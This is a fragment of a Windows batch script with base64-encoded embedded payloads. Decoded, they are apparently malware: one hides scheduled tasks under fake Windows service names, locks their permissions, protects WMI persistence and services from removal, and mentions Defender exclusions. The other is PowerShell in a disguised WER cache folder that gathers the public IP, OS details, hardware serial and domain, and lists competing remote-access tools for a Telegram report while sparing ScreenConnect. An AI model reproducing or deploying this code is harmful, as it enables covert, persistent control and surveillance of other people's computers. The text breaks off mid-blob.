dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
ZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVUJSIgL1IgL0QgWSA+bnVs
IDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6ciA+bnVsIDI+JjENCmljYWNscyAiJVQl
IiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJV
c2VycyIgIkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJTlRF
UkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAwDQo=
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIFRHX1JFUE9SVCBCVUlMRCAyMDI2MDgwMlQxNiAtIHJv
b3QtbGV2ZWwgdGFzayBuYW1lcyAoSURFTlRWRVI9Nyk7IFRSIG93bmVyc2hpcDsgUk1NK0RhdHRv
IGtlZXA7IGR5bmFtaWMgZ3J5eGEgRlAKcGFyYW0oCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwKICAgIFtzdHJpbmddJFN1bW1hcnkgPSAnJywKICAgIFtz
dHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRl
bXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywKICAgIFtWYWxpZGF0ZVNl
dCgncmljaCcsICdjb21wYWN0JyldW3N0cmluZ10kTW9kZSA9ICdyaWNoJywKICAgIFtzdHJpbmdd
JEJ1aWxkID0gJ08xNScsCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJwopCgokRXJyb3JBY3Rpb25Q
cmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2ls
ZW50bHlDb250aW51ZScKdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQ
cm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9Cgpm
dW5jdGlvbiBHZXQtQ2ZnIHsKICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJwogICAgJGNmZyA9IEB7fQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcGF0aCkpIHsgcmV0
dXJuICRjZmcgfQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFjaC1P
YmplY3QgewogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9XHMq
KC4qKVxzKiQnKSB7CiAgICAgICAgICAgICRjZmdbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0u
VHJpbSgpCiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICRjZmcKfQoKZnVuY3Rpb24gRXNjKFtz
dHJpbmddJHMpIHsKICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcnIH0KICAgIHJldHVy
biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNl
ICc+JywgJyZndDsnKQp9CgpmdW5jdGlvbiBHZXQtUHVibGljSXAgewogICAgZm9yZWFjaCAoJHUg
aW4gQCgKICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycsCiAgICAgICAgICAgICdo
dHRwczovL2lmY29uZmlnLm1lL2lwJywKICAgICAgICAgICAgJ2h0dHBzOi8vaWNhbmhhemlwLmNv
bScKICAgICAgICApKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHIgPSBJbnZva2UtV2Vi
UmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgNgogICAgICAgICAg
ICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcpLlRyaW0oKQogICAgICAgICAgICBpZiAo
JGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6Jykg
eyByZXR1cm4gJGlwIH0KICAgICAgICB9IGNhdGNoIHt9CiAgICB9CiAgICByZXR1cm4gJ24vYScK
fQoKZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsKICAgIHRyeSB7CiAgICAgICAgJGlwcyA9IEdldC1O
ZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1pbHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAn
MTI3LionIC1hbmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwKICAgICAgICAg
ICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSVBBZGRyZXNzIC1VbmlxdWUKICAgICAg
ICBpZiAoJGlwcykgeyByZXR1cm4gKCRpcHMgLWpvaW4gJywgJykgfQogICAgfSBjYXRjaCB7fQog
ICAgdHJ5IHsKICAgICAgICAkaXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFw
dGVyQ29uZmlndXJhdGlvbiAtRmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfAogICAgICAgICAgICBG
b3JFYWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAk
XyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoKCRpcHMgfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIC1qb2luICcsICcp
IH0KICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAnbi9hJwp9CgpmdW5jdGlvbiBHZXQtT3NJbmZv
IHsKICAgICRvID0gW29yZGVyZWRdQHsKICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24g
PSAnbi9hJzsgQnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnCiAgICAgICAgRG9tYWluID0gJ24v
YSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScKICAgICAgICBDUFUgPSAn
bi9hJzsgTWFudWZhY3R1cmVyID0gJ24vYSc7IE1vZGVsID0gJ24vYSc7IFNlcmlhbCA9ICduL2En
CiAgICAgICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1Np
emVfR0IgPSAnbi9hJwogICAgfQogICAgdHJ5IHsKICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFu
Y2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9u
CiAgICAgICAgJG8uVmVyc2lvbiA9ICRvcy5WZXJzaW9uCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXIKICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlCiAgICAgICAg
JG8uSW5zdGFsbERhdGUgPSAoJG9zLkluc3RhbGxEYXRlIHwgR2V0LURhdGUgLUZvcm1hdCAneXl5
eS1NTS1kZCcpCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwgR2V0
LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpCiAgICAgICAgJG8uVG90YWxSQU1fR0Ig
PSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
Q29tcHV0ZXJTeXN0ZW0KICAgICAgICAkby5Eb21haW4gPSBpZiAoJGNzLlBhcnRPZkRvbWFpbikg
eyAkY3MuRG9tYWluIH0gZWxzZSB7ICRjcy5Xb3JrZ3JvdXAgfQogICAgICAgICRvLk1hbnVmYWN0
dXJlciA9ICRjcy5NYW51ZmFjdHVyZXIKICAgICAgICAkby5Nb2RlbCA9ICRjcy5Nb2RlbAogICAg
fSBjYXRjaCB7fQogICAgdHJ5IHsKICAgICAgICAkby5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdp
bjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5h
bWUpCiAgICB9IGNhdGNoIHt9CiAgICB0cnkgewogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2lt
SW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyCiAgICB9IGNhdGNoIHt9CiAgICB0cnkg
ewogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIg
IkRldmljZUlEPSdDOiciCiAgICAgICAgJG8uRGlza0ZyZWVfR0IgPSBbbWF0aF06OlJvdW5kKCRk
LkZyZWVTcGFjZSAvIDFHQiwgMSkKICAgICAgICAkby5EaXNrU2l6ZV9HQiA9IFttYXRoXTo6Um91
bmQoJGQuU2l6ZSAvIDFHQiwgMSkKICAgIH0gY2F0Y2gge30KICAgIHJldHVybiAkbwp9CgpmdW5j
dGlvbiBHZXQtU3ZjTGluZShbc3RyaW5nXSRuYW1lKSB7CiAgICAkcyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoLW5vdCAkcykg
eyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0KICAgIHJldHVybiAoJ3swfSAoU3RhcnQ9ezF9KScg
LWYgJHMuU3RhdHVzLCAkcy5TdGFydFR5cGUpCn0KCmZ1bmN0aW9uIEdldC1UYXNrSGVhbHRoKFtz
dHJpbmddJHRuKSB7CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZP
IExJU1QgL1YgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91
dCkgewogICAgICAgIHJldHVybiBAeyBQcmVzZW50ID0gJGZhbHNlOyBTdGF0dXMgPSAnTUlTU0lO
Ryc7IE5leHQgPSAnJzsgTGFzdCA9ICcnOyBSZXN1bHQgPSAnJzsgT3VycyA9ICRmYWxzZSB9CiAg
ICB9CiAgICAkbWFwID0gQHt9CiAgICAkYmxvYiA9ICgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAi
JF8iIH0pIC1qb2luICJgbiIKICAgIGZvcmVhY2ggKCRsaW5lIGluICRvdXQpIHsKICAgICAgICBp
ZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsKICAgICAgICAgICAg
JG1hcFskbWF0Y2hlc1sxXS5UcmltKCldID0gJG1hdGNoZXNbMl0uVHJpbSgpCiAgICAgICAgfQog
ICAgfQogICAgJHN0YXR1cyA9ICRtYXBbJ1N0YXR1cyddCiAgICBpZiAoLW5vdCAkc3RhdHVzKSB7
ICRzdGF0dXMgPSAkbWFwWydUYXNrIFN0YXR1cyddIH0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsg
JHN0YXR1cyA9ICdwcmVzZW50JyB9CiAgICAkbmV4dCA9ICRtYXBbJ05leHQgUnVuIFRpbWUnXQog
ICAgaWYgKC1ub3QgJG5leHQpIHsgJG5leHQgPSAnJyB9CiAgICAkbGFzdCA9ICRtYXBbJ0xhc3Qg
UnVuIFRpbWUnXQogICAgaWYgKC1ub3QgJGxhc3QpIHsgJGxhc3QgPSAnJyB9CiAgICAkcmVzdWx0
ID0gJG1hcFsnTGFzdCBSZXN1bHQnXQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
JycgfQogICAgJHRyID0gJG1hcFsnVGFzayBUbyBSdW4nXQogICAgaWYgKC1ub3QgJHRyKSB7ICR0
ciA9ICRtYXBbJ1Rhc2sgdG8gUnVuJ10gfQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kp
b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAg
IyBQcmVzZW50IFdpbmRvd3MgYnVpbHQtaW4gd2l0aCBzYW1lIG5hbWUgaXMgTk9UIGhlYWx0aHkg
Zm9yIHVzCiAgICAkaGVhbHRoeSA9ICRvdXJzIC1hbmQgKCgkc3RhdHVzIC1tYXRjaCAnUmVhZHl8
UnVubmluZycpIC1vciAoJHN0YXR1cyAtZXEgJ3ByZXNlbnQnKSkKICAgIHJldHVybiBAewogICAg
ICAgIFByZXNlbnQgPSAkdHJ1ZQogICAgICAgIE91cnMgICAgPSBbYm9vbF0kb3VycwogICAgICAg
IEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQogICAgICAgIFN0YXR1cyAgPSAkKGlmICgkb3Vycykg
eyAkc3RhdHVzIH0gZWxzZSB7ICdOT1RfT1VSUycgfSkKICAgICAgICBOZXh0ICAgID0gJG5leHQK
ICAgICAgICBMYXN0ICAgID0gJGxhc3QKICAgICAgICBSZXN1bHQgID0gJHJlc3VsdAogICAgICAg
IFRyICAgICAgPSAkKGlmICgkdHIpIHsgJHRyIH0gZWxzZSB7ICcnIH0pCiAgICB9Cn0KCmZ1bmN0
aW9uIEdldC1SbW1IaXRzIHsKICAgICMgRGV0ZWN0IHJpdmFscyBmb3IgVGVsZWdyYW0uIEtFRVA6
IFNjcmVlbkNvbm5lY3QgYWxsb3dsaXN0ICsgRGF0dG8vQ2VudHJhU3RhZ2UuCiAgICAkdG9rZW5z
ID0gQCgKICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0Fn
ZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywKICAgICAgICAnV2lu
Vk5DJywgJ3ZuY3NlcnZlcicsICd0dl8nLCAnU3BsYXNodG9wJywgJ1pvaG8gQXNzaXN0JywgJ1J1
c3REZXNrJywgJ1JlbW90ZVBDJywgJ0RhbWVXYXJlJywKICAgICAgICAnQXRlcmFBZ2VudCcsICdB
dGVyYScsICdOaW5qYVJNTScsICdOaW5qYU9uZScsICdOaW5qYVJNTUFnZW50JywgJ0thc2V5YScs
ICdBZ2VudE1vbicsICdQdWxzZXdheScsICdQQyBNb25pdG9yJywgJ1N5bmNybycsICdLYWJ1dG8n
LAogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENl
bnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lz
ZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsCiAgICAgICAgJ0FjdGlvbjEnLCAn
U2ltcGxlSGVscCcsICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2gg
Q2VudHJhbCcsICdNZXNoIEFnZW50JywKICAgICAgICAnVGFjdGljYWxSTU0nLCAndGFjdGljYWxy
bW0nLCAnR2V0U2NyZWVuJywgJ1N1cHJlbW8nLCAncnV0c2VydicsICdyZW1vdGluZ19ob3N0JywK
ICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0Jywg
J0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywKICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAn
TmF2ZXJpc2snLCAnSW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJl
cicsICdEb21vdHonLCAnQXV2aWsnLAogICAgICAgICdCYXJyYWN1ZGEgUk1NJywgJ01hbmFnZWQg
V29ya3BsYWNlJywgJ0dvdmVybGFuJywgJ1BEUSBEZXBsb3knLCAnUERRIEludmVudG9yeScsICdQ
RFEgQ29ubmVjdCcsCiAgICAgICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdU
YWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcics
ICdBZXJvQWRtaW4nLAogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5l
JywgJ0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1VsdHJhVk5D
JywgJ1JlYWxWTkMnCiAgICApCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0
YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpCiAgICAkaGl0cyA9IE5ldy1P
YmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiAgICAkc2VlbiA9
IEB7fQoKICAgIGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
ewogICAgICAgICRrZXkgPSAiJGtpbmR8JG5hbWUiLlRvTG93ZXJJbnZhcmlhbnQoKQogICAgICAg
IGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQogICAgICAgICRzZWVuWyRr
ZXldID0gJHRydWUKICAgICAgICBbdm9pZF0kaGl0cy5BZGQoKCctIFt7MH1dIDxjb2RlPnsxfTwv
Y29kZT4nIC1mICRraW5kLCAoRXNjICRuYW1lKSkpCiAgICB9CiAgICBmdW5jdGlvbiBUZXN0LUtl
ZXBOYW1lKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNl
IH0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRva2VucykgeyBpZiAoJHMgLWxpa2UgIiok
ayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CgogICAg
R2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJG4gPSAkXy5OYW1lCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQogICAg
ICAgIGlmIChUZXN0LUtlZXBOYW1lICRuIC1vciBUZXN0LUtlZXBOYW1lICRkKSB7CiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAt
b3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsKICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tl
ZXAtZGF0dG8nICgiJG4gKCQoJF8uU3RhdHVzKSkiKQogICAgICAgICAgICB9CiAgICAgICAgICAg
IHJldHVybgogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9rZW5zKSB7CiAgICAg
ICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgewogICAgICAg
ICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1cykpIikKICAgICAgICAgICAg
ICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgR2V0LVByb2Nlc3Mg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
JG4gPSAkXy5Qcm9jZXNzTmFtZQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7IHJldHVy
biB9CiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2VucykgewogICAgICAgICAgICBpZiAoJG4g
LWxpa2UgIiokdCoiKSB7CiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbgogICAgICAg
ICAgICAgICAgYnJlYWsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAkdW5pbnN0
ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
cnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicKICAgICkKICAgIGZv
cmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRo
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAg
ICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0
dXJuIH0KICAgICAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJGRuKSB7CiAgICAgICAgICAgICAg
ICBpZiAoJGRuIC1saWtlICcqRGF0dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykg
eyBBZGQtSGl0ICdrZWVwLWRhdHRvJyAkZG4gfQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAg
